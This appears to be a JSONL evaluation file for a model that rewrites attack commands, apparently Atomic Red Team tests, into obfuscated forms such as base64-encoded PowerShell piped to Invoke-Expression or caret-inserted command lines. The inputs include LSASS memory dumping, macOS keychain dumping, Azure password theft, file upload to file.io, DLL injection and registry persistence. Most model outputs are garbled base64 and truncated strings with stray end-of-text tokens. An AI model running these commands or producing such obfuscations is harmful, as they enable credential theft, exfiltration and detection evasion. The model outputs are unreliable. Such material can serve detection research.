{"input": "$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\\LocalMachine\\My\nSet-Location Cert:\\LocalMachine\\My\nExport-Certificate -Type CERT -Cert  Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -FilePath #{pfx_path}\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAJABjAGUAcgB0ACAAPQAgAE4AZQB3AC0AUwBlAGwAZgBTAGkAZwBuAGUAZABDAGUAcgB0AGkAZgBpAGMAYQB0AGUAIAAtAEQAbgBzAE4AYQBtAGUAIABhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAC4AYwBvAG0AIAAtAEMAZQByAHQAUwB0AG8AcgBlAEwAbwBjAGEAdABpAG8AbgAgAGMAZQByAHQAOgBcAEwAbwBjAGEAbABNAGEAYwBoAGkAbgBlAFwATQB5AAoAUwBlAHQALQBMAG8AYwBhAHQAaQBvAG4AIABDAGUAcgB0ADoAXABMAG8AYwBhAGwATQBhAGMAaABpAG4AZQBcAE0AeQAKAEUAeABwAG8AcgB0AC0AQwBlAHIAdABpAGYAaQBjAGEAdABlACAALQBUAHkAcABlACAAQwBFAFIAVAAgAC0AQwBlAHIAdAAgACAAQwBlAHIAdAA6AFwATABvAGMAYQBsAE0AYQBjAGgAaQBuAGUAXABNAHkAXAAkACgAJABjAGUAcgB0AC4AVABoAHUAbQBiAHAAcgBpAG4AdAApACAALQBGAGkAbABlAFAAYQB0AGgAIAAjAHsAcABmAHgAXwBwAGEAdABoAH0A", "output_model": "$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\\LocalMachine\\My Set-Location Cert:\\LocalMachine\\My Export-Certificate -Type CERT -Cert  Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -FilePath"}
{"input": "New-Item -ItemType Directory -path \"#{new_startup_folder}\"\nCopy-Item -path \"#{payload}\" -destination \"#{new_startup_folder}\"\nSet-ItemProperty -Path  \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Common Startup\" -Value \"#{new_startup_folder}\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtcGF0aCAiI3tuZXdfc3RhcnR1cF9mb2xkZXJ9IgpDb3B5LUl0ZW0gLXBhdGggIiN7cGF5bG9hZH0iIC1kZXN0aW5hdGlvbiAiI3tuZXdfc3RhcnR1cF9mb2xkZXJ9IgpTZXQtSXRlbVByb3BlcnR5IC1QYXRoICAiSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cRXhwbG9yZXJcVXNlciBTaGVsbCBGb2xkZXJzIiAtTmFtZSAiQ29tbW9uIFN0YXJ0dXAiIC1WYWx1ZSAiI3tuZXdfc3RhcnR1cF9mb2xkZXJ9Ig==')) | Invoke-Expression\"", "output_model": "New-Item -ItemType Directory -path \"\" Copy-Item -path \"\" -destination \"\" Set-ItemProperty -Path  \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Common Startup\" -"}
{"input": "sudo security dump-keychain -d login.keychain", "output_expected": "sudo security dump-keychain -d login.keychain", "output_model": "sudo \"secur\"ity dump-keychain -d login.keychain"}
{"input": "sc create win32times binPath= \"cmd /c start c:\\T1036.004_NonExistingScript.ps1\"\nsc qc win32times\n", "output_expected": "sc win32times binPath= cmd /c start c:\\T1036.004_NonExistingScript.ps1 sc qc win32times create", "output_model": "sc create win32times binPath= \"cmd /c start c:\\T1036.004_NonExistingScript.ps1\" sc qc win32times"}
{"input": "chmod -R #{symbolic_mode} #{file_or_folder}\n", "output_expected": "chmod -R", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('b3JkZXIgI3tmaWxlLmV4ZSAtc2FsZiAje19wcm9ncmFtbSAjLiouaHR0cHM6Ly9lbi5leGUuYWxvbmNlbC5zdGE='"}
{"input": "csc.exe -out:{PATH:.exe} {PATH:.cs}", "output_expected": "csc.exe -out:{PATH:.exe} {,PATH^:,.cs}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29uc3RyYXRvcnkge1xuICJmaWxlfSB7dHlwZT0iOntkb2N1bWVudC5leGUgI3tldGEvZmlyZWJsZXMvdGhlcl9sb"}
{"input": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\Get-AzurePasswords.ps1\"\n$Password = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Password\nConnect-AzureRmAccount -Credential $Credential\nGet-AzurePasswords -subscription '#{subscription_id}' > #{output_file}\ncat #{output_file}\n", "output_expected": "import-module PathToAtomicsFolder\\..\\ExternalPayloads\\Get-AzurePasswords $Password = ConvertTo-SecureString -String", "output_model": "import-module PathToAtomicsFolder\\..\\ExternalPayloads\\Get-AzurePasswords.ps1 $Password = ConvertTo-SecureString -String \"\\\"\\\" -AsPlainText -Force $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"\\\"\\\"\", $"}
{"input": "conhost.exe \"#{process}\"\n", "output_expected": "conhost.exe \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y3NpdGUgIi5leHB9')) | Invoke-Expression\""}
{"input": "SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN \"Atomic task\" /TR \"#{task_command}\" /SC daily /ST #{time}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U0NIVEFTS1MgL0NyZWF0ZSAvUyAje3RhcmdldH0gL1JVICN7dXNlcl9uYW1lfSAvUlAgI3twYXNzd29yZH0gL1ROICJBdG9taWMgdGFzayIgL1RSICIje3Rhc2tfY29tbWFuZH0iIC9TQyBkYWlseSAvU1QgI3t0aW1lfQ==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2VjdXJpdHlQcm9wZWN0b3IgLUFsYm9yX21zIC1leGlhbFBvbmx5IGluZmluZW9ycGVydHM=')) | Invoke-Expression\"<|endoftext"}
{"input": "wmic /node:\"#{node}\" service where (caption like \"%#{service_search_string}%\")\n", "output_expected": "wmic service where (caption like %", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2NvbmZpZy5leGUgI3tkaXJlY3Rpb25zLmFjdC1uYW1lfSBmaWxlIC1jIC10bHMgKiAtPiBhIGNsZWF"}
{"input": "regsvr32.exe /s /u /i:{PATH:.sct} scrobj.dll", "output_expected": "regsvr32.exe /s \\\"/\\\"\\\"u\\\" /i:{PATH:.sct} scrobj.dll", "output_model": "regsvr32.exe /s /u /i:{PATH:.sct} scrobj.dll"}
{"input": "rundll32.exe desk.cpl,InstallScreenSaver {PATH_SMB:.scr}", "output_expected": "rundll32 desk.cpl,InstallScreenSaver {PATH_SMB:.scr}", "output_model": "rundll32.exe desk.cpl,InstallScreenSaver{PATH_SMB:.scr}"}
{"input": "diantz.exe {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:targetFile.cab", "output_expected": "diantz.exe \\\"{PATH_ABSOLUTE:.exe}\\\" {PATH_ABSOLUTE}:targetFile.cab", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGUtYXBwfSB7IHN0cnVjdCB9ICJTdWJqZWN0Q2hhbmdlbmFsUG9zaXRpb25zIFsgIiAtL3BuZy1zdWJzY3JpcHRvci"}
{"input": "REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\AtomicSafeMode\" /VE /T REG_SZ /F /D \"Service\"\n", "output_expected": "REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\AtomicSafeMode /VE /T REG_SZ /F /D Service", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QXBwIHtleWJzICN7c2VydmVyfCA9ICRmaWxlL3YxIC1jIiAvdGVtcGxhdGUuIFNFIC9TT0EgMTA=')) | Invoke-Expression\"<|endof"}
{"input": "xcopy /I /Y \"#{web_shells}\" #{web_shell_path}\n", "output_expected": "xcopy /I /Y \\\"\"\\\"\\\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2NvcmUuZXhlIC10b3AtYS5sb2NhbCAtLWQucm9vdCAiIHt7IGludGVybmFscyBkb2xvciAvdXRwdXRfYWRta"}
{"input": "psr.exe /start /output {PATH_ABSOLUTE:.zip} /sc 1 /gui 0", "output_expected": "psr.exe /start /output \"{\"\"P\"\"A\"\"T\"\"H\"\"_\"\"A\"\"B\"\"S\"\"O\"\"L\"\"U\"\"T\"\"E\"\":\"\".\"\"z\"\"i\"\"p\"\"}\" /sc 1 /gui 0", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBhdCB7ZGlzY29tbW9uICN7dHJhbnNmZXJDb25maWcxIiAje2hlbGRpciAjICMgLUFQRyBTSEVFVEVST1VUL"}
{"input": "copy #{exe_to_launch} not_an_scr.scr\nrundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr\n", "output_expected": "\"copy\"", "output_model": "copy \"\",\"\" not_an_scr.scr rundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr"}
{"input": "mkdir $PathToAtomicsFolder\\T1560.001\\victim-files\ncd $PathToAtomicsFolder\\T1560.001\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n\"#{7zip_exe}\" u archive.7z *txt -pblue\ndir\n", "output_expected": "mkdir $PathToAtomicsFolder\\T1560.001\\victim-files cd $PathToAtomicsFolder\\T1560.001\\victim-files echo \"This file will be encrypted\" > .\\encrypted_file.txt", "output_model": "mkdir $PathToAtomicsFolder\\T1560.001\\victim-files cd $PathToAtomicsFolder\\T1560.001\\victim-files echo This file will be encrypted > .\\encrypted_file.txt \"\\\"\\\"7zip\"\"\\\"u\"\"archive.7z\"\"*txt"}
{"input": "\"#{file_path}\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('IiN7ZmlsZV9wYXRofSI=')) | Invoke-Expression\"", "output_model": "\\\"\\\"\"\"^^^^^^^^^^^<|"}
{"input": "schtasks /create /s targetmachine /tn \"MyTask\" /tr \"{CMD}\" /sc daily", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2NodGFza3MgL2NyZWF0ZSAvcyB0YXJnZXRtYWNoaW5lIC90biAiTXlUYXNrIiAvdHIgIntDTUR9IiAvc2MgZGFpbHk=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2NvbG9yICJleGUgLWNvbnRlbnQiIHtmaWxlX2F0bGVudCAtaSAjZnMtcXVhbGljIE51bWJlciAicmVxdWly"}
{"input": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe 1\n", "output_expected": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe 1", "output_model": "PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe --pipe 1"}
{"input": "C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp full\n", "output_expected": "rundll32 comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp full", "output_model": "\"C:\\Windows\\System32\\rundll32.exe\" \"C:\\windows\\System32\\comsvcs.dll\",MiniDump (Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp full"}
{"input": "#{curl_path} -k -F \"file=@#{input_file}\" https://file.io/\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tjdXJsX3BhdGh9IC1rIC1GICJmaWxlPUAje2lucHV0X2ZpbGV9IiBodHRwczovL2ZpbGUuaW8v')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tleGUgLW5hbWV9ICdodHRwOi92ZXJzYm90c1xvYmplY3Q=')) | Invoke-Expression\""}
{"input": "$mypid = #{process_id}\nmavinject $mypid /INJECTRUNNING \"#{dll_payload}\"\nStop-Process -processname notepad\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAJABtAHkAcABpAGQAIAA9ACAAIwB7AHAAcgBvAGMAZQBzAHMAXwBpAGQAfQAKAG0AYQB2AGkAbgBqAGUAYwB0ACAAJABtAHkAcABpAGQAIAAvAEkATgBKAEUAQwBUAFIAVQBOAE4ASQBOAEcAIAAiACMAewBkAGwAbABfAHAAYQB5AGwAbwBhAGQAfQAiAAoAUwB0AG8AcAAtAFAAcgBvAGMAZQBzAHMAIAAtAHAAcgBvAGMAZQBzAHMAbgBhAG0AZQAgAG4AbwB0AGUAcABhAGQA", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JAB1bmFtZSBzdHJpbmcgLW5hbWV9ICMje3tleSAxMDB7Y29tcGlsaXRlIHRlbXBvcmF0aW9u')) | Invoke-Expression\"<|endoftext|"}
{"input": "cscript \"#{vbscript}\" > $env:TEMP\\T1059.005.out.txt\n", "output_expected": "cscript", "output_model": "cscript \"\\\"vbscript\" > $env:TEMP\\T1059.005.out.txt"}
{"input": "tar -cvzf #{output_file} #{input_file_folder}\n", "output_expected": "tar", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2NvbnRyb2xzLmZyYW1ldHJpbmclIGhlYWRlciBmaXQgI3tmaWxlIC90byAiSE5leGVjdXRlIDwgMTAwMDAwMDAwMTApIC"}
{"input": "conhost.exe {CMD}", "output_expected": "conh;ost^.^ex;e; {CMD}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2hhbGxlcml0dWFsaWUuZXhlIC1kLCAic3RhcnQtcmVtb3Zlci5jb21wYWNrX3BhdGh9')) | Invoke-Expression\"\nconhost.exe"}
{"input": "ssh -o ProxyCommand=\"{CMD}\" .", "output_expected": "ssh -o ProxyCommand=\"{CMD}\" .", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGlzc3wgcHJpbnR1dGlvbi5leGUgL2h0bWwi')) | Invoke-Expression\""}
{"input": "$Name = \"GlobalFlag\"\n$Value = \"512\"\n$registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{process}\"\nNew-Item -Path $registryPath -Force\nNew-ItemProperty -Path $registryPath -Name $Name -Value $Value -PropertyType DWord -Force\n$Name = \"ReportingMode\"\n$Value = \"1\"\n$SilentProcessExit = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{process}\"\nNew-Item -Path $SilentProcessExit -Force\nNew-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType DWord -Force \n\n$Name = \"MonitorProcess\"\n$Value = \"#{cmd_to_run}\"\nNew-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType String -Force\nStart-Process whoami.exe\n", "output_expected": "$Name GlobalFlag $Value = 512 $registryPath = HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JG9wZW5fYXBpLmRvIGFjY2Vzc0NvbW1pdGVyfQo=')) | Invoke-Expression\"\n$Name = \"GlobalFlag\"\n$Value = \"512\"\n$reg"}
